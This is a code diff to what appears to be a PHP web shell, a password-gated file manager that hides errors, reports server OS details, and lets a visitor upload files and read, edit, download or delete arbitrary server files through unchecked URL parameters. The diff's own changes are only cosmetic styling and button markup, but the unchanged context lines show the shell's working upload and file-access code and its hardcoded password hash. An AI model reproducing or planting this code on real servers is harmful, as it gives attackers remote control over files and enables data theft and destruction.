@@ -6,6 +6,7 @@
 <body>	
 	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.6.3/css/all.min.css"  />
+	<style type="text/css">.formfile{float: right;margin-right:20%;} input,button{width:120px;} @media all and (max-width: 980px){ svg { width: 4%; } input, button { width: 100%;text-align: center; display: inline-block; font-size: 3rem; margin: 4px 2px; cursor: pointer; background-color: #e7e7e7; color: black; } .formfile { width: 100%; float: left; margin-right: 0; } } </style>
 	<script type="text/javascript">
 		function addUrlParameter(nama, value){
 			var newURL = location.href.split("?search")[0];
@@ -28,7 +29,6 @@
 	<?php
 	error_reporting(0);
 	session_start();
-	// session_destroy();
 	
 	$password = "b68b70b4fa5d1aa81292d4ceb48fcca7"; //md5 : openfile
 	
@@ -129,7 +129,7 @@
 	echo "OS : ".OS();
 	echo ' <b>('.php_uname().')</b>';
 	echo "<br>";
-	echo '<br/><div style="float: right;margin-right:20%;">';
+	echo '<br/><div class="formfile">';
 	echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 	if( $_POST['_upl'] == "Upload" ) {
@@ -193,11 +193,11 @@
 		$myfile = fopen($_GET['dir'].$_GET['f'], "r") or die("Unable to open file!");
 		echo '<textarea name="code" class="form-control" rows="20" autofocus>'.htmlspecialchars(fread($myfile,filesize($_GET['dir'].$_GET['f']))).'</textarea>';
 		fclose($myfile);
-		echo '<div class="col-sm-4"><input type="submit" class="btn btn-primary" name="" value="Edit"/></div>
+		echo '<input type="submit" class="btn btn-primary" name="" value="Edit"/>
 		</form> 
-		<div class="col-sm-4"><button class="btn btn-success" onclick="addUrlParameter('."'act','download'".')">Download</button>
-		<button class="btn btn-danger" onclick="deleteFile('."'act','delete'".');">delete</button></div>
-		</div>';
+		<button class="btn btn-success" onclick="addUrlParameter('."'act','download'".')">Download</button>
+		<button class="btn btn-danger" onclick="deleteFile('."'act','delete'".');">Delete</button></div>
+		';
 	}
 
 	?>
